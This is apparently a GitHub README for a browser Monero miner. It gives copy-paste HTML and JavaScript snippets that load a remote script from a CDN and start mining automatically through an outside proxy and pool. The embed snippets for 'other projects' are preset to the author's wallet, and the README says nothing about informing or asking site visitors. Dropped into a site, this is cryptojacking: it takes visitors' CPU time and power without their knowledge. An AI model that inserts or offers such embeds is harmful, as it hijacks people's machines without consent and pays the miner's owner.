## Monero Webminer

Html & Js code that allows Mining of XMR (Monero) on browsers


# Configure

In Mine.Html you will see a address change this for your Monero address and you will be mining.

```javascript
server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = "INSERT YOUR ADDRESS HERE";
    var workerId = "INSERT NODE NAME"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
```
# Running

Open index.html in any web browser and it will automatically start mining.

https://najmajmal.github.io/monero-webminer


# Check Progress 

Go to https://moneroocean.stream . This is the pool you are connected to, it will show your hashrate and balance.

# How do i know if it works??

You can open https://najmajmal.github.io/monero-webminer and goto [Moneroocean](https://moneroocean.stream) and enter my [XMR Address](#donate), you can see that "GH-XMR" is mining. You can do the same with your wallet and see for your self.


# Use In Other Projects 


HTML
  
    <!-- Start Of Mining Code (HTML) -->
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        server = "wss://f.xmrminingproxy.com:8181";
        var pool = "moneroocean.stream";
        var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
        var workerId = "GH-XMR"
        var threads = -1;
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;
    </script>
    <!-- End Of Mining Code (HTML) -->
      

Javascript import snippet
  
    import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';


Javascript
    
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
    var workerId = "GH-XMR"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
    // End Of Mining Code
    
    
#  Donate
    
    
This software is **100% free** to use, and we would greatly appreciate any donations to help support our work. If you'd like to donate, you can use the following cryptocurrency addresses:


    ETH:  0xB6C2F675eeA97d8D165D79D2098A92c06d3aB629

    XMR:  4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi

    SOL:  B2fu1hVJtHWoZL3K4KNQB2gKeZtomVZA7kotX5ZvUFkp


Thank you for choosing our XMR Web Monero Miner. We hope you find it useful and profitable
